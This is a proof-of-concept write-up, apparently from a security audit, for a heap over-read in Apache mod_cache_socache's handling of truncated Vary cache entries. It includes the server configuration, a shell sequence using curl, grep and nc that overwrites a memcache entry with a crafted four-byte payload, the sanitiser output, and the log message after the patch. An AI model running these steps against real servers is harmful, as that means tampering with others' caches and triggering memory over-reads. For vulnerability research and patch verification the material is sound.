# PoC 054 — truncated Vary cache entry over-reads `expire`

`open_entity()` reads `apr_time_t expire` from a Vary-format socache entry
without proving the retrieved length covers `sizeof(format) + sizeof(expire)`.
A truncated entry produces an out-of-bounds read of the APR allocation tail.

## Setup

Same build + configuration as PoC 053. `mod_cache_socache` plus the
`socache_memcache` provider, run under ASan/MSan to make the read visible.

```
Listen 127.0.0.1:8080
LoadModule cache_module           modules/mod_cache.so
LoadModule cache_socache_module   modules/mod_cache_socache.so
LoadModule socache_memcache_module modules/mod_socache_memcache.so

CacheSocache memcache:127.0.0.1:11211
<Location />
    CacheEnable socache
</Location>
```

Make the origin response include a `Vary` header so a Vary-format entry
gets created naturally:

```
Header always set Vary "Accept-Encoding"
```

## Trigger

1. Warm the cache so a Vary entry exists:

```
curl -H 'Accept-Encoding: identity' http://127.0.0.1:8080/index.html
```

2. Locate the Vary index key in `error_log` (lookups log the cache key)
   and overwrite the stored value with a four-byte payload that decodes as
   `CACHE_SOCACHE_VARY_FORMAT_VERSION` but provides no `expire` bytes:

```
KEY=$(grep -oE 'vary cache key: [^ ]+' logs/error_log | tail -1 | awk '{print $4}')

# format = 0x56415259 ("VARY") in little-endian as the Vary version constant
python3 -c 'import sys; sys.stdout.buffer.write(b"\x59\x52\x41\x56")' \
  | (printf 'set %s 0 0 4\r\n' "$KEY"; cat; printf '\r\n') \
  | nc -q1 127.0.0.1 11211

curl -i -H 'Accept-Encoding: identity' http://127.0.0.1:8080/index.html
```

The exact format constant must match the build's
`CACHE_SOCACHE_VARY_FORMAT_VERSION`; read it from
`modules/cache/mod_cache_socache.h` of your tree before encoding.

## Observed effect

ASan / MSan diagnostic at `modules/cache/mod_cache_socache.c:542`:

```
==pid==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x...
READ of size 8 at 0x...
    #0 ... in open_entity .../mod_cache_socache.c:542
```

Without a sanitiser the request still returns content (the over-read
`expire` value is not propagated downstream in the audited revision), but
unrelated bytes from the APR allocator pool are touched on every lookup of
the malformed entry.

## Log marker

Pre-patch: silent. Post-patch:

```
[cache_socache:error] AH10426 Cache vary entry for key '...' too short, removing
```
